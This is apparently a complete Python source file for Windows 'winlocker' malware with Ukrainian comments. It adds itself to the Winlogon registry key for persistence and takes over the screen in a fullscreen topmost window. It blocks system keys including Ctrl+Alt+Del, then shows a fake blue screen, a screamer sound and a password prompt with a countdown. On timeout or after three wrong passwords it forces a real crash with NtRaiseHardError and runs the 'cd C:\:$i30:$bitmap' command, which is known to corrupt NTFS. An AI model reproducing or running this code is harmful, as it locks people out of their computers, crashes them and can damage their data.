import tkinter as tk # gui вікно
from tkinter import messagebox as m # повідомлення
import ctypes # for bsod
import ctypes.wintypes # connect ctypes
import keyboard # для блокування клавіш
import os, sys # для роботи
import subprocess # тоже для бсод
from playsound import playsound # програвач музики
import math # draw eye
import random # errors on screen(fake)
import winreg # в винлогон
import winreg as reg



path = os.path.realpath(sys.argv[0])
name = os.path.basename(path)
sub_key = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

attempts = 0 # сбрасуєм спроби

# лого на початку ascii
logo = """
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  #@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@   :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   +@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@.    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#    .@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@-  =   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  :  .@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@+   @#  %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-  %@   :@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@   =@#  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@:  .@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@   %@@*  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@:  .@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@   *@@@   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.  *@@@   .@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@.  =@@@@   %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+  .@@@@   +@@@@@@@@@@@@@@
@@@@@@@@@@@@@#   @@@@%   #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   @@@@@   %@@@@@@@@@@@@@
@@@@@@@@@@@@@   @@@@@#   *@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   @@@@@*   @@@@@@@@@@@@@
@@@@@@@@@@@@:  =@@@@@#   :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-   @@@@@@.  -@@@@@@@@@@@@
@@@@@@@@@@@@   @@@@@@%   :@@@@@@@@@@@@@@@@@@@@%+-          -#@@@@@@@@@@@@@@@@@@@@@    @@@@@@%   @@@@@@@@@@@@
@@@@@@@@@@@-  .@@@@@@@    @@@@@@@@@@@@@@#.                        .%@@@@@@@@@@@@@@   .@@@@@@@   @@@@@@@@@@@@
@@@@@@@@@@@:  =@@@@@@@.   +@@@@@@@@@%.      .+@@@@@@@@@@@@@@@@=       :@@@@@@@@@@.  .@@@@@@@@   -@@@@@@@@@@@
@@@@@@@@@@@   =@@@@@@@@@   *@@@@@#     -@@@@@@@@@@@@@@@@@@@@@@@@@@@#.    .@@@@@@*   +@@@@@@@@=  .@@@@@@@@@@@
@@@@@@@@@@@   =@@@@@@@@@#   #@@-       .@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@*   @@@@@@@@@@*  .@@@@@@@@@@@
@@@ %@@@@@@   =@@@@@@@@@@@        @#@@* %@@@@@@@@@@@@@@@@@@@@@@@@@@. @@@@+        @@@@@@@@@@@*  .@@@@@@* @@@
@@@  @@@@@@:  =@@@@@@@@@@@@:         =@ @@@@@@@@@@@@@@@@@@@@@@@@@@@:*@.         *@@@@@@@@@@@@   -@@@@@@  %@@
@@@   @@@@@=  .@@@@@@@@@@@@@@@=:      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%     .:*@@@@@@@@@@@@@@@   @@@@@@   @@@
@@@   .@@@@@   @@@@@@@@@@@@@@@@@@@@  .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  .@@@@@@@@@@@@@@@@@@@%   @@@@@   :@@@
@@@     @@@@+  .@@@@@@@@@@@@@@@@@@#  +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#  @@@@@@@@@@@@@@@@@@@   *@@@@    *@@@
@@@+ .:  @@@@.  .@@@@@@@@@ :%@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@--@@@@@@@@@:  =@@@#  =  *@@@
@@@@  +%  .@@@   :@@@@@@@@@@=       @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#       +@@@@@@@@@@   :@@@   @.  @@@@
@@@@   +@   #@@    +@@@@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   @@@@@@@@@@@%#   :@@+  -@:   @@@@
@@@@    -@@   @@*        -+==-    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=    -=+=:        @@%   @@    %@@@@
@@@@@  @  @@#   @@%             %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=             @@@   #@% :*  @@@@@
@@@@@. :@= .@@*      =@*==.-=@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#==.--*@:      @@@  #@. .@@@@@
@@@@@#  @@   -@@%   .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@.  .@@  @@@@@@
@@@@@@. =*:@#  -@   -@@@@@@@ .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@@*  =@   @@:%. .@@@@@@
@@@@@@#  @@@* .      @@@@@@  @@@@@@@@@@@@@@@@@@@@@ -@@@@  @@@@@@@@@@@@@@@@@@@@+ -@@@@@@        @@@@  @@@@@@@
@@@@@@@  =@@@-*@@=    @@@@%+@@@@@@@@@@@@@@@@@@@@@@.:@@@@ @@@@@@@@@@@@@@@@@@@@@@@:#@@@#    %@@ *@@@  =@@@@@@@
@@@@@@@@  %@@@#@@@@%   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*   @@@@@@@@@=  @@@@@@@@
@@@@@@@@%   .@@@@@@@+  =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:  %@@@@@@@    #@@@@@@@@
@@@@@@@@@@   .@@@@@@   +@%     =@@@@@@@@@@@@@@@@@.=@@@@@@%@@@@@@@@@@@@@@@@@@-    :@@   =@@@@@-   .@@@@@@@@@@
@@@@@@@@@@@@   *@@@@  .@@@@@@@      .@@@@@@@@@@@@ -@@@@@@ :@@@@@@@@@@@#.     .@@@@@@@   @@@@.  :@@@@@@@@@@@@
@@@@@@@@@@@@@@   :@-  @@@@@@@@@   .+.    .%@@@@@@ -@@@@@@  @@@@@@%.    :*  ..@@@@@@@@#  =@:  =@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@     +@@@@@@@@@@%-  =@@@*    .#@@  @@@@@@  @@*    .+@@@:  %@@@@@@@@@@@:    -@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@   @@@@@@@@@@@@@@#               @@@@@@              .#@@@@@@@@@@@@@:  -@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@:  *@@@@@@@@@@@@@@@@  +@@@@@@@*+#@@@@@@#+@@@@@@@@: +@@@@@@@@@@@@@@@@:  *@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@   :@@@@@@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@.   @@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@.   +@@@@@@@@@@##@@*%@@@@@@%.%@@@@@@@@ -*@@@@@@**#%#%@@@@@@@@@@+   .@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@    @@@=     .%@@@@@@@@@@@  @@@@@@@@ *@@@@@@@@@@%#:     #@@@   .@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@+   #@@@  .   @@@@@@@@@@@  %@@@@@@: :@@@@@@@@@@*   : :@@@*   #@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@*   -@@@# @   .@@@@@@@@@ *@@@@@@@@  @@@@@@@@@   .= @@@@:   @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@-   #@@@@@@=   #@@@@@@  @@@@@@@@@@  @@@@@@=   #@@@@@@    *@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@   *@@@@@@@+    @@@@+  %@@@@@@@@*  @@@@@    #@@@@@@@=   @@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@+  @@@@@@@@@. @:  -@@@  .@@@@@@   @@@-  :- =@@@@@@@@=  *@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@  .@@@@@@@@@  @@#        @@@@        %@# .@@@@@@@@@   @@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@-    =@@@@@@*  +@@%@@*    @@    #@@@@@-  @@@@@@@=    #@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%     @@@@@.   -  #@#*: -  =*@@*  -   -@@@@#    .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*    @@@@  @+   .  .:  .     . *%  @@@@    #@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#   =@@+  @@@@#.@-    =@ #@@@@  %@@:   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   =@%*  *@@@@@@@@@@@@@@@@*  @*@:  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   + *@    #@%@@@@@@@@#    @: *  :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=  :=  *#:             .*%*  #   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-   .%%+@@%@@+=*%+*@@@@#+#@    :@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-   -@@@@@@@@@@%@@@@@@@+   %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@#   -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*   %@@@@@@@@@@@@*   %@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   #@@@@@@@@@@-   @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=         .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
"""

# bsod text
bsd = """
A problem has been detected and Windows has been shut down to prevent damage 
to your computer:)

The problem seems to be caused by the following file: destroypc.sys

PAGE_FAULT_IN_NONPAGED_AREA

If this is the first time you've seen this Stop error screen, 
restart your computer. If this screen appears again, follow 
these steps:

Check to make sure any new hardware or software is properly installed. 
If this is a new installation, ask your hardware or software manufacturer 
for any Windows updates you might need.

If problems continue, disable or remove any newly installed hardware 
or software. Disable BIOS memory options such as caching or shadowing. 
If you need to use Safe Mode to remove or disable components, restart 
your computer, press F8 to select Advanced Startup Options, and then 
select Safe Mode.

Technical information:

*** STOP: 0x66666666 (0x66666666, 0x66666666, 0x66666666, 0x6666666)

*** motherfucker.sys - Address 6666666 base at 66666666, DateStamp 66666666
"""





def add_to_startup(): # в авто запуск
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, sub_key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, path)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"err: {e}")

def remove_from_startup(): # видаляєм з автозапуска
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, sub_key, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        winreg.CloseKey(key)
    except:
        pass


def labeltimer(count, timer_label, root): # таймер
    if count >= 0:
        mins, secs = divmod(count, 60)
        timer_label.config(text=f"To destroying pc was left: {mins:02d}:{secs:02d}")
        root.after(1000, lambda: labeltimer(count - 1, timer_label, root))
    else:
        bsod()


def spawn_errors(root, canvas, sw, sh): # помилки
    txt = random.choice(["Error", "Blocked", "Trojan", "Locked", "VIRUS", "malware.exe", "hacked"])
    x, y = random.randint(0, sw), random.randint(0, sh)
    

    t = canvas.create_text(x, y, text=txt, fill="red", font=("Arial", 12, "bold"))
    

    root.after(100, lambda: canvas.delete(t))
    root.after(30, lambda: spawn_errors(root, canvas, sw, sh))


def bsod(): # краш пк
    subprocess.call("cd C:\:$i30:$bitmap",shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def check_password(entry, root): # провіряєм пароль
    global attempts
    pwd = entry.get()

    if pwd == "123": # пароль
        m.showinfo("", "Password is correct!")
        remove_from_startup()
        sys.exit()
    else:
        attempts += 1
        
        remaining = 3 - attempts
        
        if attempts >= 3:
            m.showerror("", "Your PC will crash in 3 seconds!")
            root.after(3000, bsod)
        else:
            m.showwarning("", f"Invalid password! Attempts left: {remaining}")




def block_close():
    pass # ігноруємо

def main_menu(root): # головне меню
    for widget in root.winfo_children():
        widget.destroy()

    
    root.config(cursor="@hand.cur") # кастом курсор
    root.configure(bg="black") # чорний фон
    Label1 = tk.Label(root, text="Ur PC Was Blocked:)", font=("Courier", 40), bg="black", fg="red")
    Label1.pack(padx=22, pady=11)
    Label2 = tk.Label(root, text="You have 3 attempts to enter the correct password.\nif you spend 3 attemps your pc will crash!", font=("Courier", 12), bg="black", fg="red")
    Label2.pack(padx=22, pady=11)
    Label3 = tk.Label(root, text="Good Luck My Bro!\nI Like hackings computers!.", font=("Courier", 11), bg="black", fg="red")
    Label3.pack(padx=22, pady=11)
    entry = tk.Entry(root, font=("Courier", 25), show="☺", bg="black", fg="red")
    entry.pack(padx=10, pady=10)
    button = tk.Button(root, text="Enter", font=("Courier New", 20), bg="black", fg="red", command=lambda: check_password(entry, root))
    button.pack(padx=10, pady=10)
    timer_label = tk.Label(root, text="", fg="red", bg="black", font=("Arial", 20, "bold"))
    timer_label.pack(pady=10, padx=10)
    labeltimer(1200, timer_label, root)

    playsound('screamer.mp3') # скример

    sw = root.winfo_screenwidth()
    sh = root.winfo_screenheight()
    
    canvas = tk.Canvas(root, width=sw, height=sh, bg="black", highlightthickness=0)
    canvas.pack()

    cx, cy = sw // 2, sh // 2
    r = 60  # розмір ока

    canvas.create_oval(cx-150-r, cy-r, cx-150+r, cy+r, fill="red")
    pupil_l = canvas.create_oval(cx-150-20, cy-20, cx-150+20, cy+20, fill="black")
    canvas.create_oval(cx+150-r, cy-r, cx+150+r, cy+r, fill="red")
    pupil_r = canvas.create_oval(cx+150-20, cy-20, cx+150+20, cy+20, fill="black")

    def move_eyes(event):
        for p_id, offset_x in [(pupil_l, -150), (pupil_r, 150)]:
            eye_x = cx + offset_x
            eye_y = cy
            
            dx = event.x - eye_x
            dy = event.y - eye_y
            angle = math.atan2(dy, dx)
            
            dist = 40
            nx = eye_x + dist * math.cos(angle)
            ny = eye_y + dist * math.sin(angle)
            
            canvas.coords(p_id, nx-25, ny-25, nx+25, ny+25)

    root.bind('<Motion>', move_eyes)

    spawn_errors(root, canvas, sw, sh)


    # block keys
    keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+w', lambda: None, suppress=True)
    keyboard.add_hotkey('shift+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('win+r', lambda: None, suppress=True)
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('shift')
    keyboard.block_key('win')
    keyboard.block_key('del')
    keyboard.block_key('home')
    keyboard.block_key('end')
    keyboard.block_key('page up')
    keyboard.block_key('page down')
    keyboard.block_key('esc')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')
    keyboard.block_key('f5')
    keyboard.block_key('f6')
    keyboard.block_key('f7')
    keyboard.block_key('f8')
    keyboard.block_key('f9')
    keyboard.block_key('f10')
    keyboard.block_key('f11')
    keyboard.block_key('f12')


    root.mainloop()

def fake(root):

    for widget in root.winfo_children():
            widget.destroy()
            
    root.config(cursor="none")
    root.configure(bg="blue")
            
    label = tk.Label(root, text=bsd, font=("Courier", 20), bg="blue", fg="white")
    label.pack(padx=22, pady=11)
            
    playsound('crash.mp3', block=False)
    root.after(12000, lambda: main_menu(root))

        
    

    # block keys
    keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+w', lambda: None, suppress=True)
    keyboard.add_hotkey('shift+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('win+r', lambda: None, suppress=True)
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('shift')
    keyboard.block_key('win')
    keyboard.block_key('del')
    keyboard.block_key('home')
    keyboard.block_key('end')
    keyboard.block_key('page up')
    keyboard.block_key('page down')
    keyboard.block_key('esc')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')
    keyboard.block_key('f5')
    keyboard.block_key('f6')
    keyboard.block_key('f7')
    keyboard.block_key('f8')
    keyboard.block_key('f9')
    keyboard.block_key('f10')
    keyboard.block_key('f11')
    keyboard.block_key('f12')


    root.mainloop()



def load(): # загрузка лого
    add_to_startup()
    root = tk.Tk()
    root.title("WinlockerGuide")
    root.attributes("-fullscreen", True)
    root.resizable(False, False)
    root.protocol("WM_DELETE_WINDOW", block_close)
    root.grab_set()
    root.attributes("-topmost", True)
    root.configure(bg="red")
    Label1 = tk.Label(root, text=logo, font=("Courier", 8), bg="red", fg="white")
    Label1.pack(padx=22, pady=11)
    root.config(cursor="none")
    


    # block keys
    keyboard.add_hotkey('alt+f4', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+alt+del', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+shift+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+w', lambda: None, suppress=True)
    keyboard.add_hotkey('shift+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('alt+esc', lambda: None, suppress=True)
    keyboard.add_hotkey('ctrl+tab', lambda: None, suppress=True)
    keyboard.add_hotkey('win+r', lambda: None, suppress=True)
    keyboard.block_key('alt')
    keyboard.block_key('ctrl')
    keyboard.block_key('shift')
    keyboard.block_key('win')
    keyboard.block_key('del')
    keyboard.block_key('home')
    keyboard.block_key('end')
    keyboard.block_key('page up')
    keyboard.block_key('page down')
    keyboard.block_key('esc')
    keyboard.block_key('f1')
    keyboard.block_key('f2')
    keyboard.block_key('f3')
    keyboard.block_key('f4')
    keyboard.block_key('f5')
    keyboard.block_key('f6')
    keyboard.block_key('f7')
    keyboard.block_key('f8')
    keyboard.block_key('f9')
    keyboard.block_key('f10')
    keyboard.block_key('f11')
    keyboard.block_key('f12')


    root.after(3000, lambda: fake(root))




    root.mainloop()

if __name__ == "__main__":
    load()

